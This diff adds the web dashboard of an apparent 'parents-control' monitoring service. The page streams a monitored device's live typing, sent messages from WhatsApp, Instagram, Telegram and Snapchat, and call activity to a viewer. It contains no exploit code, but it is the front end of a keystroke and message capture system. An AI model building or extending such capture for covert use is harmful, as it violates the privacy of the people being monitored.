@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Activity - History</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --muted: #94a3b8;
+            --primary: #3b82f6; --green: #22c55e; --border: #334155;
+            --wa: #25D366; --ig: #E1306C; --tg: #2AABEE; --sc: #FFFC00; --phone: #0a84ff;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg); color: var(--text);
+            min-height: 100vh; padding: 12px 14px 36px;
+        }
+        .header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 14px; gap: 10px;
+        }
+        .back {
+            color: var(--muted); text-decoration: none; font-size: 0.9rem;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .back:hover { color: var(--text); }
+        .title { font-weight: 700; font-size: 1.05rem; }
+        .clear-btn {
+            background: transparent; border: 1px solid var(--border); color: var(--muted);
+            padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 0.75rem;
+        }
+        .clear-btn:hover { border-color: #ef4444; color: #ef4444; }
+
+        .live-box {
+            background: linear-gradient(135deg, rgba(59,130,246,0.12), rgba(34,197,94,0.08));
+            border: 1px solid rgba(59,130,246,0.3); border-radius: 14px;
+            padding: 12px 14px; margin-bottom: 16px;
+        }
+        .live-label {
+            font-size: 0.68rem; font-weight: 800; letter-spacing: 0.06em;
+            color: var(--primary); text-transform: uppercase; margin-bottom: 6px;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .pulse {
+            width: 7px; height: 7px; background: var(--green); border-radius: 50%;
+            animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse { 0%{opacity:1} 50%{opacity:.35} 100%{opacity:1} }
+        .live-text {
+            font-size: 0.95rem; font-weight: 600; line-height: 1.35;
+            word-break: break-word; white-space: pre-wrap;
+            max-height: 72px; overflow-y: auto;
+        }
+        .live-empty { color: var(--muted); font-weight: 500; font-size: 0.88rem; }
+
+        .section-title {
+            font-size: 0.72rem; font-weight: 700; color: var(--muted);
+            text-transform: uppercase; letter-spacing: 0.05em;
+            margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .history { display: flex; flex-direction: column; gap: 8px; }
+
+        .item {
+            background: var(--card); border: 1px solid var(--border);
+            border-radius: 12px; padding: 10px 12px;
+            display: flex; gap: 10px; align-items: flex-start;
+        }
+        .app-icon {
+            width: 32px; height: 32px; border-radius: 9px; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.95rem;
+        }
+        .app-icon.wa { background: rgba(37,211,102,0.15); color: var(--wa); }
+        .app-icon.ig { background: rgba(225,48,108,0.15); color: var(--ig); }
+        .app-icon.tg { background: rgba(42,171,238,0.15); color: var(--tg); }
+        .app-icon.sc { background: rgba(255,252,0,0.12); color: #e6e000; }
+        .app-icon.phone { background: rgba(10,132,255,0.15); color: var(--phone); }
+        .app-icon.other { background: rgba(148,163,184,0.12); color: var(--muted); }
+
+        .item-body { flex: 1; min-width: 0; }
+        .item-app {
+            font-size: 0.72rem; font-weight: 700; margin-bottom: 2px;
+        }
+        .item-app.wa { color: var(--wa); }
+        .item-app.ig { color: var(--ig); }
+        .item-app.tg { color: var(--tg); }
+        .item-app.sc { color: #c4c000; }
+        .item-app.phone { color: var(--phone); }
+        .item-app.other { color: var(--muted); }
+
+        .item-text {
+            font-size: 0.88rem; line-height: 1.35;
+            word-break: break-word; white-space: pre-wrap;
+            color: var(--text);
+        }
+        .item-text .actor { color: #cbd5e1; font-weight: 600; }
+        .item-text .msg { color: #e2e8f0; }
+        .item-meta {
+            margin-top: 4px; font-size: 0.68rem; color: var(--muted);
+        }
+        .empty-hist {
+            text-align: center; color: var(--muted); padding: 28px 16px; font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a class="back" href="index.html" id="backLink"><i class="fa-solid fa-arrow-left"></i> Back</a>
+        <div class="title"><i class="fa-solid fa-keyboard"></i> Live Activity</div>
+        <button class="clear-btn" onclick="clearHistory()">Clear</button>
+    </div>
+
+    <div class="live-box">
+        <div class="live-label"><span class="pulse"></span> Live now</div>
+        <div class="live-text live-empty" id="liveNow">Waiting for typing / call...</div>
+    </div>
+
+    <div class="section-title">
+        <span>History (final messages only)</span>
+        <span id="histCount">0</span>
+    </div>
+    <div class="history" id="historyList">
+        <div class="empty-hist">No final messages yet.</div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // --- AUTH CHECK ---
+        (function(){
+            var t = localStorage.getItem("access_token");
+            if(!t){ window.location.href='/login'; return; }
+            try {
+                var u = JSON.parse(localStorage.getItem("user") || "{}");
+                if(!u.email){ window.location.href='/login'; }
+            } catch(e){ window.location.href='/login'; }
+        })();
+
+        const API_BASE = window.location.origin.includes('localhost') || window.location.protocol === 'file:'
+            ? 'https://parents-control-website1.onrender.com'
+            : window.location.origin;
+        const params = new URLSearchParams(window.location.search);
+        let DEVICE_ID = (params.get('id') || params.get('deviceId') || localStorage.getItem('monitoring_id') || '').toString().trim().toUpperCase();
+
+        if (DEVICE_ID) {
+            localStorage.setItem('monitoring_id', DEVICE_ID);
+            document.getElementById('backLink').href = 'index.html?id=' + encodeURIComponent(DEVICE_ID);
+        }
+
+        let historyItems = [];
+        function isChatAppHistory(item) {
+            if (!item) return false;
+            const a = String(item.application || item.app || '').toLowerCase();
+            const p = String(item.packageName || item.package || '').toLowerCase();
+            const isChatApp = a.includes('whatsapp') || a.includes('instagram') || a.includes('snap')
+                || p.includes('whatsapp') || p.includes('instagram') || p.includes('snap');
+            if (!isChatApp) return false;
+            // Final sent chat events are also legitimate Live Activity history. Only
+            // temporary typing/non-final chat rows stay excluded from this list.
+            const action = String(item.action || '').toLowerCase();
+            return action !== 'sent' && action !== 'call';
+        }
+
+        const seenEventIds = new Set();
+
+        function escapeHtml(s) {
+            return String(s == null ? '' : s)
+                .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        }
+
+        function fmtTime(ts) {
+            try {
+                const d = new Date(typeof ts === 'number' ? ts : (ts ? Date.parse(ts) : Date.now()));
+                return d.toLocaleString(undefined, {
+                    hour: 'numeric', minute: '2-digit', hour12: true, month: 'short', day: 'numeric'
+                });
+            } catch (e) { return ''; }
+        }
+
+        function appKey(app) {
+            const a = (app || '').toLowerCase();
+            if (a.includes('whatsapp')) return 'wa';
+            if (a.includes('instagram')) return 'ig';
+            if (a.includes('telegram')) return 'tg';
+            if (a.includes('snapchat')) return 'sc';
+            if (a.includes('phone') || a.includes('call')) return 'phone';
+            return 'other';
+        }
+
+        function appIconClass(key) {
+            if (key === 'wa') return 'fa-brands fa-whatsapp';
+            if (key === 'ig') return 'fa-brands fa-instagram';
+            if (key === 'tg') return 'fa-brands fa-telegram';
+            if (key === 'sc') return 'fa-brands fa-snapchat';
+            if (key === 'phone') return 'fa-solid fa-phone';
+            return 'fa-solid fa-comment';
+        }
+
+        function appLabel(app, key) {
+            if (key === 'wa') return 'WhatsApp';
+            if (key === 'ig') return 'Instagram';
+            if (key === 'tg') return 'Telegram';
+            if (key === 'sc') return 'Snapchat';
+            if (key === 'phone') return 'Phone';
+            return app || 'App';
+        }
+
+        function displayParts(item) {
+            const key = appKey(item.application);
+            const actor = (item.actorName || '').trim();
+            const msg = (item.message || '').trim();
+            const action = (item.action || '').toLowerCase();
+
+            if (key === 'phone' || action === 'call') {
+                const who = actor || msg.replace(/^📞\s*/, '').replace(/call\s+chal\s+rahi\s+hai\s*→?\s*/i, '').trim();
+                return {
+                    key,
+                    lineHtml: who
+                        ? '<span class="msg">Call · ' + escapeHtml(who) + '</span>'
+                        : '<span class="msg">Call in progress</span>'
+                };
+            }
+
+            if (actor && msg) {
+                return {
+                    key,
+                    lineHtml: '<span class="actor">' + escapeHtml(actor) + '</span>' +
+                        (action === 'typing' ? ' typing: ' : ': ') +
+                        '<span class="msg">' + escapeHtml(msg) + '</span>'
+                };
+            }
+
+            let t = (item.text || item.message || '').toString().trim();
+            t = t.replace(/^(WhatsApp|Instagram|Telegram|Snapchat|Phone|Messenger)\s*→\s*/i, '');
+            t = t.replace(/^\[(WhatsApp|Instagram|Telegram|Snapchat|Phone)\]\s*/i, '');
+            return { key, lineHtml: '<span class="msg">' + escapeHtml(t || 'Activity') + '</span>' };
+        }
+
+        function normalizeEvent(raw) {
+            if (!raw) return null;
+            const eventId = raw.eventId || raw._id || '';
+            const text = (raw.text || raw.activity || '').toString();
+            const ts = raw.timestamp
+                ? (typeof raw.timestamp === 'number' ? raw.timestamp : Date.parse(raw.timestamp))
+                : Date.now();
+            return {
+                eventId: String(eventId),
+                application: raw.application || '',
+                packageName: raw.packageName || '',
+                actorName: raw.actorName || '',
+                action: raw.action || 'activity',
+                message: raw.message || '',
+                text: text,
+                timestamp: ts
+            };
+        }
+
+        function renderHistory(list) {
+            const el = document.getElementById('historyList');
+            const countEl = document.getElementById('histCount');
+            const items = Array.isArray(list) ? list : [];
+            countEl.innerText = String(items.length);
+            if (!items.length) {
+                el.innerHTML = '<div class="empty-hist">No final messages yet.</div>';
+                return;
+            }
+            el.innerHTML = items.map(function(item, i) {
+                const parts = displayParts(item);
+                const key = parts.key;
+                const label = appLabel(item.application, key);
+                return '<div class="item" data-event-id="' + escapeHtml(item.eventId || '') + '">' +
+                    '<div class="app-icon ' + key + '"><i class="' + appIconClass(key) + '"></i></div>' +
+                    '<div class="item-body">' +
+                        '<div class="item-app ' + key + '">' + escapeHtml(label) + '</div>' +
+                        '<div class="item-text">' + parts.lineHtml + '</div>' +
+                        '<div class="item-meta">' + (i === 0 ? '● Latest · ' : '') + fmtTime(item.timestamp) + '</div>' +
+                    '</div></div>';
+            }).join('');
+        }
+
+        function upsertHistoryItem(raw) {
+            const item = normalizeEvent(raw);
+            if (!item) return;
+            if (raw.liveOnly) return;
+            if (item.eventId && seenEventIds.has(item.eventId)) return;
+            // A supplied eventId is authoritative: two legitimate identical messages
+            // must remain separate. Use text/time fallback only for legacy rows without IDs.
+            const dup = !item.eventId && historyItems.find(function(h) {
+                return !h.eventId && h.text === item.text
+                    && Math.abs((h.timestamp || 0) - (item.timestamp || 0)) < 15000;
+            });
+            if (dup) return;
+            if (item.eventId) seenEventIds.add(item.eventId);
+            if (!isChatAppHistory(item)) historyItems.unshift(item);
+            if (historyItems.length > 300) {
+                const removed = historyItems.splice(300);
+                removed.forEach(function(r) { if (r.eventId) seenEventIds.delete(r.eventId); });
+            }
+            renderHistory(historyItems);
+        }
+
+        async function loadHistoryFromServer() {
+            if (!DEVICE_ID) return;
+            try {
+                const res = await fetch(API_BASE + '/api/activity-events?deviceId=' + encodeURIComponent(DEVICE_ID) + '&limit=200&t=' + Date.now(), { cache: 'no-store' });
+                const data = await res.json();
+                const list = Array.isArray(data) ? data : [];
+                historyItems = [];
+                seenEventIds.clear();
+                list.forEach(function(raw) {
+                    const item = normalizeEvent(raw);
+                    if (!item) return;
+                    if (item.eventId) seenEventIds.add(item.eventId);
+                    if (!isChatAppHistory(item)) historyItems.push(item);
+                });
+                renderHistory(historyItems);
+            } catch (e) {
+                try {
+                    const res = await fetch(API_BASE + '/api/get-data/' + encodeURIComponent(DEVICE_ID) + '/live_status?t=' + Date.now(), { cache: 'no-store' });
+                    const data = await res.json();
+                    const list = Array.isArray(data) ? data : [];
+                    historyItems = list.map(normalizeEvent).filter(Boolean).filter(function(i) {
+                        return !isChatAppHistory(i);
+                    });
+                    historyItems.forEach(function(i) { if (i.eventId) seenEventIds.add(i.eventId); });
+                    renderHistory(historyItems);
+                } catch (e2) {
+                    renderHistory([]);
+                }
+            }
+        }
+
+        async function loadLive() {
+            if (!DEVICE_ID) {
+                document.getElementById('liveNow').innerText = 'Device ID missing.';
+                return;
+            }
+            try {
+                const res = await fetch(API_BASE + '/api/get-data/' + encodeURIComponent(DEVICE_ID) + '/live_status?t=' + Date.now(), { cache: 'no-store' });
+                const data = await res.json();
+                let list = Array.isArray(data) ? data : (data && data.text ? [data] : []);
+                list = list.map(function(x) {
+                    return {
+                        text: (x && (x.text || x.activity || '')).toString(),
+                        timestamp: (x && (x.timestamp || x.time)) || Date.now()
+                    };
+                }).filter(function(x) { return x.text && x.text.trim(); });
+
+                const liveEl = document.getElementById('liveNow');
+                if (list.length > 0) {
+                    liveEl.classList.remove('live-empty');
+                    liveEl.innerText = list[0].text;
+                } else {
+                    liveEl.classList.add('live-empty');
+                    liveEl.innerText = 'Waiting for typing / call...';
+                }
+            } catch (e) {
+                document.getElementById('liveNow').innerText = 'Connection error';
+            }
+        }
+
+        function clearHistory() {
+            if (!confirm('Clear Live Activity history on server?')) return;
+            historyItems = [];
+            seenEventIds.clear();
+            renderHistory([]);
+            if (DEVICE_ID) {
+                fetch(API_BASE + '/api/clear-data', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, type: 'live_status' })
+                }).catch(function(){});
+            }
+        }
+
+        let socket = null;
+        function setupSocket() {
+            if (!DEVICE_ID || typeof io === 'undefined') return;
+            try {
+                socket = io(API_BASE, { transports: ['websocket', 'polling'] });
+                socket.on('connect', function() {
+                    socket.emit('join', DEVICE_ID);
+                    socket.emit('join-room', DEVICE_ID);
+                });
+                function onActivity(payload) {
+                    if (!payload) return;
+                    if (payload.device_id && String(payload.device_id).toUpperCase() !== DEVICE_ID) return;
+                    const text = (payload.text || '').toString();
+                    const liveEl = document.getElementById('liveNow');
+                    if (text) {
+                        liveEl.classList.remove('live-empty');
+                        liveEl.innerText = text;
+                    } else {
+                        liveEl.classList.add('live-empty');
+                        liveEl.innerText = 'Waiting for typing / call...';
+                    }
+                    if (payload.liveOnly) return;
+                    // Typing is live-only. Only a final payload/event is allowed into
+                    // immutable history; eventId alone is not enough for an old draft.
+                    if (payload.final === true) {
+                        if (text && text.trim().length >= 1) upsertHistoryItem(payload);
+                    }
+                }
+                socket.on('activity_update', onActivity);
+                socket.on('live_status_update', onActivity);
+            } catch (e) {}
+        }
+
+        loadHistoryFromServer();
+        loadLive();
+        setupSocket();
+        // Socket.IO is the primary instant path; keep HTTP fallback responsive too.
+        setInterval(loadLive, 800);
+        setInterval(loadHistoryFromServer, 30000);
+    </script>
+</body>
+</html>
